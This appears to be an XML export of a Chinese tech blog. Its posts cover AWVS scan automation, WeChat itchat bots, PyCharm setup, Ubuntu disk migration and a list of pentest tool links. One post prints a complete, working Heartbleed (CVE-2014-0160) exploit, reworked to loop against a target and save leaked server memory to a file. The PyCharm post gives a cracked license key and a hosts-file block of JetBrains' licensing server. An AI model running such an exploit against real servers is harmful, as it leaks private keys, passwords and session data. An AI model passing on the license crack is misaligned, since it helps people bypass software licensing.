',"profile_id":"11111111-1111-1111-1111-111111111111","schedule":&#123;"disable":false,"start_date":null,"time_sensitive":false&#125;,"ui_session_id":"66666666666666666666666666666666"&#125;' req_scan = urllib2.Request(url_scan, headers=headers_scan) response_scan = urllib2.urlopen(req_scan,str(data_scan)) print target_url + "添加成功！" threads.pop(0)#线程序结束标志def count(): url_count = "https://localhost:3443/api/v1/notifications/count" req_count = urllib2.Request(url_count, headers=send_headers2) response_count = urllib2.urlopen(req_count) print"当前存在%r个通知！" % json.loads(response_count.read())['count'] print"-" * 20 # print"已存在以下任务" url_info = "https://localhost:3443/api/v1/scans" req_info = urllib2.Request(url_info, headers=send_headers2) response_info = urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) num = 0 for website in all_info.get("scans"): num += 1 # print # website.get("target").get("address") + "\n target_id:" + website.get("scan_id") print"共 %r个扫描任务(最多显示100个))" % num# count()# scan、target、notification！def del_targets(): url_info = "https://localhost:3443/api/v1/targets" req_info = urllib2.Request(url_info, headers=send_headers2) response_info = urllib2.urlopen(req_info) all_info = json.loads(response_info.read()) for website in all_info["targets"]: while True: if thread_max &gt; len(threads): threads.append(threading.Thread(target=del_tmp,args=(website,)).start())#启动子线程 break# del_targets()def del_tmp(website): #删除任务 if (website.get("description")) == "222": try: url_scan_del = "https://localhost:3443/api/v1/targets/" + str(website["target_id"]) req_del = urllib2.Request(url_scan_del, headers=send_headers2) req_del.get_method = lambda: 'DELETE' response_del = urllib2.urlopen(req_del) print "ok!" threads.pop(0)#线程序结束标志 except: exit()if __name__ == "__main__": print "-" * 20 count() print""" 1、添加扫描任务并执行请输入1 2、删除所有使用该脚本添加的任务请输入2 """ choice = raw_input("&gt;") # print type(choice) if choice == "1": start_time = time.time() for url_txt in open(URL_FILE,'r').read().split(): while True: if thread_max &gt; len(threads): threads.append(threading.Thread(target=add_exec_scan,args=(url_txt,)).start())#启动线程 break count() all_time = time.time() - start_time print '共用时',all_time elif choice == "2": for i in range(del_int): del_targets() count() else: print "请重新运行并请输入1、2选择。"]]></content>
      <tags>
        <tag>Python</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现每日定时发送天气预报给自己（或其他人）]]></title>
    <url>%2F%20Python%E5%AE%9E%E7%8E%B0%E6%AF%8F%E6%97%A5%E5%AE%9A%E6%97%B6%E5%8F%91%E9%80%81%E5%A4%A9%E6%B0%94%E9%A2%84%E6%8A%A5%E7%BB%99%E8%87%AA%E5%B7%B1%EF%BC%88%E6%88%96%E5%85%B6%E4%BB%96%E4%BA%BA%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言这几天，天冷就算了，还天天下毛毛雨，潮湿难受，每天出门都要拉开窗帘跑去阳台，透过水蒙蒙的玻璃看看外面天气如何。想想每天起来第一件事都是先看看微信消息，不如趁着学习itchat这段时间写每天早上准时发送天气预报的功能吧。效果已最后一条为准，简单粗暴。 程序的大致流程：1.登录微信-》2.查询当前时间-》3.判断是否到达指定时间-》4.抓取天气信息（API）-》5.发送给直接-》6.循环（返回2） 代码12345678910111213141516171819202122232425262728293031323334353637383940414243import timeimport itchatimport requestsimport datetimedef weather(): request = requests.get('http://v.juhe.cn/weather/index?cityname=%E5%8D%97%E5%AE%81&amp;dtype=&amp;format=2&amp;key=a0415e394775292ef2afcb115fb77b3d') request.encoding='utf-8' data = request.json() #温度 emperature = data['result']['today']['temperature'] #天气 weather = data['result']['today']['weather'] #星期 week = data['result']['today']['week'] text = '今日%s\n今日温度%s\n今日天气%s'%(week,emperature,weather) return textdef wechat_send(): #itchat.auto_login(True) itchat.send(weather(),toUserName=None)def loop(h,m): itchat.auto_login(True) while True: new = datetime.datetime.now() if new.hour == h and new.minute &gt; m : try: wechat_send() print('消息已发送，当前时间：'+time.strftime("%Y-%m-%d %H:%M:%S")) except: print('消息未发送，未知错误，当前时间：'+time.strftime("%Y-%m-%d %H:%M:%S")) else: try: print('未达到指定时间段，程序延迟30分钟后重试，当前时间：'+time.strftime("%Y-%m-%d %H:%M:%S")) time.sleep(1800) except: print('已退出微信天气推送') exit()if __name__ == '__main__': loop(8,00) 总结 ：D]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python实现微信公众号每日签到（T00ls）]]></title>
    <url>%2FPython%E5%AE%9E%E7%8E%B0%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E6%AF%8F%E6%97%A5%E7%AD%BE%E5%88%B0%EF%BC%88T00ls%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言本来说是昨天写这两篇的（签到和天气发送），但是看到小伙伴给的一个exp后想做下批量，就跑去研究fofa与zoomeye的api了，所以耽误了。。。总的来说实现定时签到很简单，几行代码就可以搞定，本文就拿T00ls的工作号来做示范。程序的大致流程：1.登录微信-》2.搜索公众号-》3.发送签到-》4.延迟&gt;-》5.循环（返回3） 代码123456789101112131415161718192021222324252627import timeimport itchatitchat.auto_login(True)#查询T00lsdef find_mps(): mps = itchat.get_mps() for a in mps: if a['NickName'] == 'T00ls': return a['UserName']#检测时间，并签到def main(): while True: try: itchat.send('3',toUserName=find_mps()) time.sleep(10) print('消息已发送，当前时间为：'+time.strftime("%Y-%m-%d %H:%M:%S")) except KeyboardInterrupt: print('！！！您已手动退出！！！') breakif __name__ == '__main__': main() 总结在实际使用中我发现，由于不清楚网页微信在线状态的存活时间，不知道要在哪儿加判断，来判断微信已掉线了，所以我还是得需要再深入学习itchat，解决这个问题，写着玩玩还行，稳定性不敢保证PS：t00ls上也有同学写了签到，他说理论上可以一直签不会掉（人家附上了一个多星期的签到截图）]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识itchat-站在巨人的肩膀上python操作微信]]></title>
    <url>%2F%E5%88%9D%E8%AF%86itchat-%E7%AB%99%E5%9C%A8%E5%B7%A8%E4%BA%BA%E7%9A%84%E8%82%A9%E8%86%80%E4%B8%8Apython%E6%93%8D%E4%BD%9C%E5%BE%AE%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[简介 itchat是一个开源的微信个人号接口，使用python调用微信从未如此简单。 使用不到三十行的代码，你就可以完成一个能够处理所有信息的微信机器人。 当然，该api的使用远不止一个机器人，更多的功能等着你来发现。 该接口与公众号接口itchatmp共享类似的操作方式，学习一次掌握两个工具。 如今微信已经成为了个人社交的很大一部分，希望这个项目能够帮助你扩展你的个人的微信号、方便自己的生活。 基本操作python 2.x 安装1pip install itchat python3.x安装1pip3 install itchat 登录12import itchatitchat.auto_login(True) hotReload=True 保留登录状态，避免每次测试都需要扫码 itchat.auto_login(hotReload=True)等于itchat.auto_login(True) 输出所有好友昵称及备注1234567friends = itchat.get_friends()#输出所有好友昵称及备注for l in friends: with open('test.txt','a') as f: f.write('好友昵称：'+l['NickName']+"---好友备注："+l['RemarkName']+'\n')#RemarkName 好友备注 搜索好友1.0123456789friends = itchat.get_friends()def find_friend(name): for l in friends: if l['RemarkName'] == name: return lfriend = find_friend('猪猪')#print(str(friend))#打印该好友的相关信息print(friend['UserName']);#itchat.send('测试发送',toUserName=friend['UserName'])#发送消息【测试发送】给一名叫【猪猪】的好友 其中UserName索引为itchat发送消息时必填选项（唯一标识符），因此搜索的目的就是找出这一串字符供后续发送时用。 搜索好友2.012345#查询好友2.0 会多返回一层空的list# friend = itchat.search_friends(name='猪猪')[0]## print(friend['UserName']) 调用模块自带的方法搜索 输出所有公众号名称123456#获取公众号内容1.0#mps = itchat.get_mps()for a in mps: with open('mps.txt','a') as f: f.write('公众号为:'+a['NickName']+'\n') 搜索公众号1.012345678#搜索公众号def find_mps(name): mps = itchat.get_mps() for a in mps: if a['NickName'] == name: return a['UserName']username = find_mps('T00ls') 定义find_mps函数搜索名为T00ls的公众号 搜搜公众号2.0123#搜索公众号2.0 同获取好友2.0一样mps = itchat.search_mps(name='T00ls')[0]print(str(mps)) 输出所有群聊12345#获取群组1.0chatrooms = itchat.get_chatrooms()for a in chatrooms: with open('chatrooms','a') as f: f.write('群组名为：'+a['NickName']+'\n') 搜索群聊1.0123456def find_chatrooms(name): chatrooms = itchat.get_chatrooms() for a in chatrooms: if a['NickName'] == name: return aprint(find_chatrooms('英福泰科')) 搜索群聊2.0123#搜索群组2.0chatroom = itchat.search_chatrooms(name='英福泰科')print(str(chatroom)) 小结上午学习了itchat一些简单的使用方法，下午写了此文用作记录，明天根据实际需求，写出两个小demo，一个用来挂在服务器上对微信公众号进行签到，另一个抓取天气预报后发送给群聊或者手机（或许会学习使用AI机器人的接口通过对机器人查询天气，然后将起返回的消息处理后发送）]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Deepin官网安装Pycharm|激活|汉化]]></title>
    <url>%2FDeepin%E5%AE%98%E7%BD%91%E5%AE%89%E8%A3%85Pycharm%7C%E6%BF%80%E6%B4%BB%7C%E6%B1%89%E5%8C%96%2F</url>
    <content type="text"><![CDATA[前言由于deepin商城中的pycharm迟迟未更新，因此打算手动安装官网最新版（2018.3）并写下记录供其他有需要的朋友参照。 操作安装Pycharm下载后解压并安装12345sudo wget -o /usr/local/bin/ https://download-cf.jetbrains.com/python/pycharm-professional-2018.3.2.tar.gz #下载cd /usr/local/bin/ #切换目录sudo tar zxvf pycharm-professional-2018.3.2.tar.gz #解压cd pycharm-2018.3.2/bin/ #切换目录sudo sh pycharm.sh #安装pycharm 选择第三项 跳过设置后会弹出激活选项，接下进行激活 激活激活方式我选择使用激活码进行激活 优点：Window、Mac、Ubantu都稳定有效，关键是这种激活方式不会产生其他影响缺点：需要修改hosts文件 修改hosts文件编辑/etc/hosts文件将0.0.0.0 account.jetbrains.com添加至文件末尾123sudo vim /etc/hostsa:wq 复制激活码选择Activation code激活，然后复制下面的激活码点击激活。（有效期至2019年5月4号）1K71U8DBPNE-eyJsaWNlbnNlSWQiOiJLNzFVOERCUE5FIiwibGljZW5zZWVOYW1lIjoibGFuIHl1IiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IkZvciBlZHVjYXRpb25hbCB1c2Ugb25seSIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifSx7ImNvZGUiOiJSUzAiLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjAxOS0wNS0wNCJ9LHsiY29kZSI6IlJEIiwicGFpZFVwVG8iOiIyMDE5LTA1LTA0In0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifSx7ImNvZGUiOiJEQyIsInBhaWRVcFRvIjoiMjAxOS0wNS0wNCJ9LHsiY29kZSI6IkRCIiwicGFpZFVwVG8iOiIyMDE5LTA1LTA0In0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAxOS0wNS0wNCJ9LHsiY29kZSI6IkFDIiwicGFpZFVwVG8iOiIyMDE5LTA1LTA0In0seyJjb2RlIjoiRFBOIiwicGFpZFVwVG8iOiIyMDE5LTA1LTA0In0seyJjb2RlIjoiR08iLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifSx7ImNvZGUiOiJQUyIsInBhaWRVcFRvIjoiMjAxOS0wNS0wNCJ9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDE5LTA1LTA0In0seyJjb2RlIjoiUEMiLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifSx7ImNvZGUiOiJSU1UiLCJwYWlkVXBUbyI6IjIwMTktMDUtMDQifV0sImhhc2giOiI4OTA4Mjg5LzAiLCJncmFjZVBlcmlvZERheXMiOjAsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-Owt3/+LdCpedvF0eQ8635yYt0+ZLtCfIHOKzSrx5hBtbKGYRPFDrdgQAK6lJjexl2emLBcUq729K1+ukY9Js0nx1NH09l9Rw4c7k9wUksLl6RWx7Hcdcma1AHolfSp79NynSMZzQQLFohNyjD+dXfXM5GYd2OTHya0zYjTNMmAJuuRsapJMP9F1z7UTpMpLMxS/JaCWdyX6qIs+funJdPF7bjzYAQBvtbz+6SANBgN36gG1B2xHhccTn6WE8vagwwSNuM70egpahcTktoHxI7uS1JGN9gKAr6nbp+8DbFz3a2wd+XoF3nSJb/d2f/6zJR8yJF8AOyb30kwg3zf5cWw==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog== 汉化打开终端使用wget下载汉化包解压移动至/usr/local/bin/pycharm-2018.3.2/lib目录下12345wget https://github.com/ewen0930/PyCharm-Chinese/releases/download/0.8.3-beta-v2018.3/PyCharm_2018.3_zh_utf-8.zipunzip PyCharm_2018.3_zh_utf-8.zipsudo cp /usr/local/bin/pycharm-2018.3.2/lib/resources_en.jar /usr/local/bin/pycharm-2018.3.2/lib/resources_en.jar.bak #备份语言文件sudo mv lib/resources_zh.jar /usr/local/bin/pycharm-2018.3.2/lib/resources_en.jar #移动中文汉化包sh /usr/local/bin/pycharm-2018.3.2/bin/pycharm.sh 此时我们打开pycharm后会发现英文变成了乱码，由于字体的问题，我们需要安装字体来解决中文乱码。 解决中文乱码问题相信大部分Deepin选手都还是双系统，因此直接把Windows下 /Windows/Fonts的文件夹 复制到 Deepin下/usr/share/fonts/文件夹中，并把Fonts改名为winFonts。再次启动pycharm即可1sh /usr/local/bin/pycharm-2018.3.2/bin/pycharm.sh 好吧，字真丑 创建启动快捷方式 然后输入管理员密码，再去看看你的deepin启动器吧 下载地址Pycharm1[Pycharm官方下载地址](https://www.jetbrains.com/pycharm/download/#section=linux) 打开链接，选择专业版下载回本地 激活1[三种激活方法](https://blog.csdn.net/u014044812/article/details/78727496) 根据个人洗好选择你喜欢的激活方式 汉化1[汉化文件](https://github.com/ewen0930/PyCharm-Chinese/releases) 根据本机安装pycharm版本，选择对应的汉化包 汉化乱码字体包1[winFonts]()]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Deepin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Heartbleed心脏出血-循环搜集脚本]]></title>
    <url>%2FHeartbleed%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80-%E5%BE%AA%E7%8E%AF%E6%90%9C%E9%9B%86%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[前言14年的漏洞，帮大佬打杂根据网上的exp改的循环利用，搜集信息可用。 修改如下：1.去除返回的偏移量与非Ascii字符2.新增两个参数 -t 与 -d 分别为间隔时间，单位秒；输出文件名 使用方法1python3 LoopHeartbleed.py 192.168.50.120 -p 443 -t 5 -d out.log 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175# Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]# Date: [2014-04-09]# Exploit Author: [Csaba Fitzl]# Vendor Homepage: [http://www.openssl.org/]# Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]# Version: [1.0.1f]# Tested on: [N/A]# CVE : [2014-0160]#The second revision comes from GuoKer #!/usr/bin/env python# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)# The author disclaims copyright to this source code.# Modified by Csaba Fitzl for multiple SSL / TLS version supportimport sysimport structimport socketimport timeimport selectimport refrom optparse import OptionParseroptions = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')options.add_option('-t', '--time', type='int', default=10, help='Time to test (default: 10)')options.add_option('-d', '--dest', type='str', default='out.txt', help='Text output to test (default: out.txt)')def h2bin(x): return x.replace(' ', '').replace('\n', '').decode('hex')version = []version.append(['SSL 3.0','03 00'])version.append(['TLS 1.0','03 01'])version.append(['TLS 1.1','03 02'])version.append(['TLS 1.2','03 03'])def create_hello(version): hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 5343 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cfbd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 0000 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 8800 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1cc0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0cc0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 1100 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 0403 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 1900 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 0800 06 00 07 00 14 00 15 00 04 00 05 00 12 00 1300 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 0000 0f 00 01 01''') return hellodef create_hb(version): hb = h2bin('18 ' + version + ' 00 03 01 ff ff') return hbdef hexdump(s): #########ascii characters ########## opts, args = options.parse_args() times = time.strftime('%Y.%m.%d.%H.%M.%S',time.localtime(time.time())) pdat = '' for b in xrange(0, len(s), 16): lin = [c for c in s[b : b + 16]] pdat += ''.join((c if 32 &lt;= ord(c) &lt;= 126 else '.' )for c in lin) print '%s' % (pdat.replace('......', ''),) print '----------------------------'+times+'----------------------------------' with open(opts.dest,'a') as f: f.write('%s' % (pdat.replace('......', ''),)) f.write('\n----------------------------'+times+'----------------------------------\n') #printdef recvall(s, length, timeout=5): endtime = time.time() + timeout rdata = '' remain = length while remain &gt; 0: rtime = endtime - time.time() if rtime &lt; 0: return None r, w, e = select.select([s], [], [], 5) if s in r: data = s.recv(remain) # EOF? if not data: return None rdata += data remain -= len(data) return rdatadef recvmsg(s): hdr = recvall(s, 5) if hdr is None: print 'Unexpected EOF receiving record header - server closed connection' return None, None, None typ, ver, ln = struct.unpack('&gt;BHH', hdr) pay = recvall(s, ln, 10) if pay is None: print 'Unexpected EOF receiving record payload - server closed connection' return None, None, None print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)) return typ, ver, paydef hit_hb(s,hb): s.send(hb) while True: typ, ver, pay = recvmsg(s) if typ is None: print 'No heartbeat response received, server likely not vulnerable' return False if typ == 24: print 'Received heartbeat response:' hexdump(pay) if len(pay) &gt; 3: print 'WARNING: server returned more data than it should - server is vulnerable!' else: print 'Server processed malformed heartbeat, but did not return any extra data.' return True if typ == 21: print 'Received alert:' hexdump(pay) print 'Server returned error, likely not vulnerable' return Falsedef delay(int): time.sleep(int)def main(): opts, args = options.parse_args() if len(args) &lt; 1: options.print_help() return times = time.strftime('%Y.%m.%d.%H.%M.%S',time.localtime(time.time())) while True:#test for i in range(len(version)): print 'Trying ' + version[i][0] + '...' s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) print 'Connecting...' sys.stdout.flush() s.connect((args[0], opts.port)) print 'Sending Client Hello...' sys.stdout.flush() s.send(create_hello(version[i][1])) print 'Waiting for Server Hello...' sys.stdout.flush() while True: typ, ver, pay = recvmsg(s) if typ == None: print 'Server closed connection without sending Server Hello.' return # Look for server hello done message. if typ == 22 and ord(pay[0]) == 0x0E: break print 'Sending heartbeat request...' sys.stdout.flush() s.send(create_hb(version[i][1])) if hit_hb(s,create_hb(version[i][1])): #Stop if vulnerable break delay(opts.time)if __name__ == '__main__': main()]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次给Ubuntu搬家（迁移系统至SSD）]]></title>
    <url>%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%99ubuntu%E6%90%AC%E5%AE%B6%EF%BC%88%E8%BF%81%E7%A7%BB%E7%B3%BB%E7%BB%9F%E8%87%B3ssd%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言近日，一名小伙伴给我安利了一波deepin大法，但无奈我微星的本子装ubuntu都麻烦，因此强行安装一波后用户体验极差，思来想去还是ubuntu靠谱。但无奈很早之前我把ubuntu装在了机械硬盘上，现在又想把系统原封不动的迁移到固态上因此就有了此文。仅做记录，有错误的地方请大佬斧正，若有更便捷的方法还请告知。 准备工作操作系统：Ubuntu 16.04 LTS使用软件：Systemback 、 Grub CustomizerU盘一个 SystembackSystemback是一个Ubuntu系统中用于发布自定义系统镜像和系统备份的软件。有时候我们对自己的Ubuntu做了很多设置，比如各种软件包，各种自定义的配置。我们想要在另一台电脑上也安装一个和我们一模一样的系统，这个时候就会用到这种方法了。这个方法不仅可以用于发布系统，也可以用来作为系统备份使用。 12sudo add-apt-repository ppa:nemh/systembacksudo apt-get update &amp;&amp; sudo apt-get install systemback unionfs-fuse Grub CustomizerGrub Customizer ，是一个很酷的GRUB2 配置工，图形化界面，让你配置更简单，轻松上手。 123sudo add-apt-repository ppa:danielrichter2007/grub-customizersudo apt-get updatesudo apt-get install grub-customizer 实际操作安装好systemback后在Dash菜单中找到并打开 根据提示输入管理密码进入主界面 在【还原点操作】处点击【创建新的】创建好我们的第一个还原点，也以便以后做系统测试时莫名其妙的系统崩溃了用做还原。 创建live终于……创建好了还原点后我们在【功能菜单】处点击【创建live系统】 记得勾上【包含用户数据文件】然后点击【创建新的】创建完成后我们插入U盘将创建好的live镜像写入Upan。在【创建支持live模式的镜像】处选择我们刚刚创建好的镜像后找到【live模式选项】中的【向目标设备写入】然后等待写入完成 写入SSD当完成写入后，重启电脑进入BIOS将第一启动项设置成U盘进入系统，打开systembackfile:///media/guoker/%E5%BC%80%E5%8F%91/U%E7%9B%98%E4%B8%AD%E7%9A%84systembak.png点击【功能菜单】处的【系统安装】设置好账号密码等相关信息后点击下一步选择好分区并勾上【传递用户配置文件及用户数据】（不推荐在ssd上挂载swap）选择完成后点击【绿色的左箭头】点击下一步等待写入完成即可 引导启动写入完成后我们需要修改grub2来完成引导新的ubuntu启动（貌似我这儿系统完成写入后不会自动修改引导进入存放在ssd上的ubuntu而是默认进入装在机械硬盘上的系统）由于我对grub并不熟悉，所以我选择使用Grub Customizer来完成修改。在Dash菜单中找到Grub Customizer输入管理员密码后启动由于我现在已经修改好了，所以我的截图会与实际不符，大家操作的时候只要选中第一项右键编辑即可查看引导的信息选中并复制，然后我们新建一条把我们复制下来的内容黏贴进去，并做修改（两个修改事项分区位置和uuid），首先我们之前安装的位置是在第一硬盘的第三分区（hd0,gpt3）然后再查看我们的硬盘uuid以及安装的系统所在的分区。1sudo blkid #查询硬盘UUID uuid=67990180-344a-45ad-b765-fb9dfe56978f完成替换后我们保存新建的条项目，在【常规设置】中【默认项】里的【预定义】设置成我们先建的条项目，点击保存即可。 end重启后即可进入安装在ssd上的系统]]></content>
      <tags>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全信息资料库（感谢backlion整理）]]></title>
    <url>%2F%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E8%B5%84%E6%96%99%E5%BA%93%EF%BC%88%E6%84%9F%E8%B0%A2backlion%E6%95%B4%E7%90%86%EF%BC%89%2F</url>
    <content type="text"><![CDATA[原文地址：https://www.t00ls.net/pytools.html 感谢backlion整理 漏洞及渗透练习平台：WebGoat漏洞练习平台：https://github.com/WebGoat/WebGoat webgoat-legacy漏洞练习平台:https://github.com/WebGoat/WebGoat-Legacy zvuldirll漏洞练习平台：https://github.com/710leo/ZVulDrill vulapps漏洞练习平台：https://github.com/Medicean/VulApps dvwa漏洞练习平台：https://github.com/RandomStorm/DVWA 数据库注入练习平台 ：https://github.com/Audi-1/sqli-labs 用node编写的漏洞练习平台，like OWASP Node Goat：https://github.com/cr0hn/vulnerable-node Ruby编写的一款工具，生成含漏洞的虚拟机：https://github.com/cliffe/secgen 花式扫描器 ：Nmap端口扫描器：https://github.com/nmap/nmap 本地网络扫描器：https://github.com/SkyLined/LocalNetworkScanner 子域名扫描器：https://github.com/lijiejie/subDomainsBrute https://github.com/aboul3la/Sublist3r https://github.com/TheRook/subbrute https://github.com/infosec-au/altdns linux漏洞扫描：https://github.com/future-architect/vuls 基于端口扫描以及关联CVE:https://github.com/m0nad/HellRaiser 漏洞路由扫描器：https://github.com/jh00nbr/Routerhunter-2.0 迷你批量信息泄漏扫描脚本：https://github.com/lijiejie/BBScan Waf类型检测工具：https://github.com/EnableSecurity/wafw00f 服务器端口弱口令扫描器：https://github.com/wilson9x1/fenghuangscanner_v3 Fox-scan扫描器：https://github.com/fengxuangit/Fox-scan/ 信息搜集工具 :社工收集器：https://github.com/n0tr00t/Sreg Github信息搜集：https://github.com/sea-god/gitscan github Repo信息搜集工具：https://github.com/metac0rtex/GitHarvester 信息探测及扫描工具：https://github.com/darryllane/Bluto 内部网络信息扫描器：https://github.com/sowish/LNScan 远程桌面登录扫描器：https://github.com/linuz/Sticky-Keys-Slayer 网络基础设施渗透工具https://github.com/SECFORCE/sparta SNMAP密码破解:https://github.com/SECFORCE/SNMP-Brute WEB：webshell大合集：https://github.com/tennc/webshell 渗透以及web攻击脚本：https://github.com/brianwrf/hackUtils web渗透小工具大合集：https://github.com/rootphantomer/hacktoolsfor_me XSS数据接收平台：https://github.com/firesunCN/BlueLotus_XSSReceiver XSS与CSRF工具：https://github.com/evilcos/xssor xss多功能扫描器：https://github.com/shawarkhanethicalhacker/BruteXSS web漏洞扫描器:https://github.com/andresriancho/w3af WEB漏洞扫描器：https://github.com/sullo/nikto 渗透常用小工具包：https://github.com/leonteale/pentestpackage web目录扫描器:https://github.com/maurosoria/dirsearch web向命令注入检测工具：https://github.com/stasinopoulos/commix 自动化SQL注入检查工具：https://github.com/epinna/tplmap SSL扫描器：https://github.com/rbsec/sslscan 安全工具集合：https://github.com/codejanus/ToolSuite apache日志分析器：https://github.com/mthbernardes/ARTLAS php代码审计工具：https://github.com/pwnsdx/BadCode web指纹识别扫描：https://github.com/urbanadventurer/whatweb 检查网站恶意攻击：https://github.com/ciscocsirt/malspider wordprees漏洞扫描器：https://github.com/wpscanteam/wpscan 固件漏洞扫描器：https://github.com/misterch0c/firminator_backend 数据库注入工具https://github.com/sqlmapproject/sqlmap Web代理：https://github.com/zt2/sqli-hunter 新版中国菜刀：https://github.com/Chora10/Cknife git泄露利用EXP：https://github.com/lijiejie/GitHack 浏览器攻击框架：https://github.com/beefproject/beef 自动化绕过WAF脚本：https://github.com/khalilbijjou/WAFNinja https://github.com/owtf/wafbypasser 一款开源WAF：https://github.com/SpiderLabs/ModSecurity 